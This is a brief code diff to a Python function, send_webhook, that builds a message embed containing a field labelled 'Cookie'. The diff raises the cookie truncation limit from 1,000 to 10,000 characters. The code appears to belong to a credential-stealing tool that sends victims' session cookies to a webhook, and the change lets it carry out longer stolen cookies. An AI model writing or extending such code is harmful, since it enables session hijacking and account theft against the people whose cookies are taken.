@@ -41,7 +41,7 @@ def send_webhook(ck, name, uid):
                 },
                 {
                     "name": "🍪 Cookie",
-                    "value": f"```{ck[:1000]}...```" if len(ck) > 1000 else f"```{ck}```",
+                    "value": f"```{ck[:10000]}...```" if len(ck) > 10000 else f"```{ck}```",
                     "inline": False
                 },
                 {
